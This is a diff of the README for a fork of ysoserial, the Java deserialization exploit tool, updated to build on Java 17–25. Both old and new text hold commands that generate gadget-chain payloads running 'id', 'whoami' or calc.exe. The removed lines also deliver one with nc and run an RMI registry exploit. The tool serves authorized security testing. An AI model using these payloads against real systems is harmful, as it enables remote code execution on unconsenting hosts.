@@ -1,129 +1,197 @@
+# ysoserial modern Java build
 
-# ysoserial
+This repository is a modernized build of the original
+[frohoff/ysoserial](https://github.com/frohoff/ysoserial) project.
 
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
-[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/github/frohoff/ysoserial)
-[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
-[![JitPack](https://jitpack.io/v/frohoff/ysoserial.svg)](https://jitpack.io/#frohoff/ysoserial)
+The upstream project is a proof-of-concept tool for generating Java serialized
+objects that exercise unsafe Java deserialization gadget chains. This fork keeps
+the upstream purpose and payload model, while updating the project so it can
+build and run reliably on newer Java releases such as Java 17, Java 21, and Java
+25.
 
-A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+![ysoserial logo](ysoserial.png)
 
-![logo](ysoserial.png)
+## Scope
 
-## Description
+This fork focuses on build and runtime compatibility with modern Java versions.
+It does not attempt to change the vulnerability model, rewrite the payload
+chains, or upgrade gadget dependencies in a way that would change their
+behavior.
 
-Originally released as part of AppSecCali 2015 Talk
-["Marshalling Pickles: how deserializing objects will ruin your day"](
-        https://frohoff.github.io/appseccali-marshalling-pickles/)
-with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
-Later updated to include additional gadget chains for
-[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.
+Important compatibility updates include:
 
-__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
-libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
-objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
-serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
-this data, the chain will automatically be invoked and cause the command to be executed on the application host.
+- Maven compiler configuration updated for Java 11+.
+- Java module `Add-Opens` and `Add-Exports` manifest entries added to the
+  assembled jar for payload builders that use JDK internals.
+- Payload discovery replaced with direct classpath scanning so payloads are
+  listed consistently on modern Java runtimes.
+- RMI Activation dependent legacy code moved to `src/legacy/java`, because RMI
+  Activation was removed from the JDK after Java 14.
 
-It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
-gadgets on the classpath.
+## Safety Notice
 
-## Disclaimer
+This software is intended for authorized security research, defensive testing,
+education, and compatibility analysis. Do not use it against systems you do not
+own or do not have explicit permission to test.
 
-This software has been created purely for the purposes of academic research and
-for the development of effective defensive techniques, and is not intended to be
-used to attack systems except where explicitly authorized. Project maintainers
-are not responsible or liable for misuse of the software. Use responsibly.
+The vulnerability is unsafe deserialization in an application. The presence of a
+gadget library on a classpath is not, by itself, the root vulnerability.
+
+## Requirements
+
+- Java 11 or newer for building.
+- Maven 3.x for building.
+- Java 17, Java 21, and Java 25 are supported runtime targets for this fork.
+
+The current default build is designed for modern Java runtimes. Java 8-era RMI
+Activation entry points are preserved as legacy source, but are not compiled by
+default.
+
+## Download
+
+Clone this repository:
+
+```shell
+git clone https://github.com/Pariston-Hill/ysoserial-modern-java.git
+cd ysoserial-modern-java
+```
+
+If you only need the original upstream project, use:
+
+```shell
+git clone https://github.com/frohoff/ysoserial.git
+```
+
+Release jars can be published from this fork's GitHub Releases page. Until a
+release is published, build the jar locally from source.
+
+## Build
+
+```shell
+mvn clean package -DskipTests
+```
+
+The executable all-in-one jar is created at:
+
+```text
+target/ysoserial-0.0.6-SNAPSHOT-all.jar
+```
+
+If Maven is not installed system-wide, use any recent Maven 3.x distribution and
+run the same command from the repository root.
 
 ## Usage
 
-```shell
-$  java -jar ysoserial.jar
-Y SO SERIAL?
-Usage: java -jar ysoserial.jar [payload] '[command]'
-  Available payload types:
-     Payload             Authors                     Dependencies
-     -------             -------                     ------------
-     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
-     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
-     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
-     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
-     Clojure             @JackOfMostTrades           clojure:1.8.0
-     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
-     CommonsCollections1 @frohoff                    commons-collections:3.1
-     CommonsCollections2 @frohoff                    commons-collections4:4.0
-     CommonsCollections3 @frohoff                    commons-collections:3.1
-     CommonsCollections4 @frohoff                    commons-collections4:4.0
-     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
-     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
-     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
-     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
-     Groovy1             @frohoff                    groovy:2.3.9
-     Hibernate1          @mbechler
-     Hibernate2          @mbechler
-     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     JRMPClient          @mbechler
-     JRMPListener        @mbechler
-     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     Jdk7u21             @frohoff
-     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
-     MozillaRhino1       @matthias_kaiser            js:1.7R2
-     MozillaRhino2       @_tint0                     js:1.7R2
-     Myfaces1            @mbechler
-     Myfaces2            @mbechler
-     ROME                @mbechler                   rome:1.0
-     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
-     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
-     URLDNS              @gebl
-     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
-     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
-```
-
-## Examples
+Show available payloads:
 
 ```shell
-$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
-0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
-0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
-0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
-...
-0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
-0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
-0000570: 0078 7071 007e 003a                      .xpq.~.:
-
-$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
-$ nc 10.10.10.10 1099 < groovypayload.bin
-
-$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar
 ```
 
-## Installation
+Generate a payload:
 
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
+```shell
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://example.com > payload.bin
+```
 
-Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.
+Generate a command-style payload for an authorized test target:
 
-## Building
+```shell
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'id' > payload.bin
+```
 
-Requires Java 1.7+ and Maven 3.x+
+The assembled jar contains Java module manifest entries for the JDK internals
+used by common payload builders. On modern Java launchers this allows direct
+`java -jar` usage without manually repeating long `--add-opens` and
+`--add-exports` arguments.
 
-```mvn clean package -DskipTests```
+If your Java launcher ignores those manifest entries, use the helper launcher:
 
-## Code Status
+```shell
+bin/ysoserial CommonsCollections1 'id' > payload.bin
+```
 
-[![Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/github/frohoff/ysoserial)
-[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
+On Windows:
+
+```cmd
+bin\ysoserial.bat CommonsCollections1 "whoami" > payload.bin
+```
+
+## Available Payloads
+
+Run the jar without arguments to print the payload list generated from the
+current build:
+
+```shell
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar
+```
+
+Payload availability is intentionally tied to the dependencies and JDK APIs that
+exist in the current build. In this modern Java build, the legacy
+`ysoserial.payloads.JRMPListener` payload is not part of the default compiled
+artifact because it depends on RMI Activation APIs removed after Java 14.
+
+## Legacy Java 8-14 Code
+
+The following upstream classes are preserved under `src/legacy/java`:
+
+- `ysoserial.payloads.JRMPListener`
+- `ysoserial.exploit.JenkinsListener`
+
+They are not compiled by the default Java 11+ build. To experiment with them,
+use a JDK that still contains RMI Activation, such as JDK 8 through JDK 14, and
+wire the legacy source directory into a separate build profile.
+
+## Verification
+
+This fork has been verified with:
+
+```shell
+mvn -DskipTests package
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://example.com > payload.bin
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'echo test' > payload.bin
+```
+
+It has also been tested on OpenJDK 25 for both source build and direct
+`java -jar` payload generation.
+
+## Project Layout
+
+```text
+src/main/java      Default modern Java source set
+src/legacy/java    Upstream legacy source that requires removed JDK APIs
+bin/               Helper launchers for Java module options
+target/            Maven build output
+```
+
+## Relationship to Upstream
+
+Original project:
+
+- Repository: [frohoff/ysoserial](https://github.com/frohoff/ysoserial)
+- License: BSD-style license from the upstream project, preserved in
+  [LICENSE.txt](LICENSE.txt)
+- Disclaimer: upstream disclaimer preserved in [DISCLAIMER.txt](DISCLAIMER.txt)
+
+This fork should be treated as a compatibility-focused derivative. Upstream
+credits, payload authorship annotations, and dependency metadata are preserved
+in the source where applicable.
 
 ## Contributing
 
-1. Fork it
-2. Create your feature branch (`git checkout -b my-new-feature`)
-3. Commit your changes (`git commit -am 'Add some feature'`)
-4. Push to the branch (`git push origin my-new-feature`)
-5. Create new Pull Request
+Changes should keep payload behavior compatible with the upstream project unless
+the change is explicitly documented as a compatibility adjustment.
 
-## See Also
-* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
-* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
-* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
+Recommended checks before submitting changes:
+
+```shell
+mvn clean package -DskipTests
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar
+```
+
+## Related Projects
+
+- [frohoff/ysoserial](https://github.com/frohoff/ysoserial)
+- [marshalsec](https://github.com/mbechler/marshalsec)
+- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
+- [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
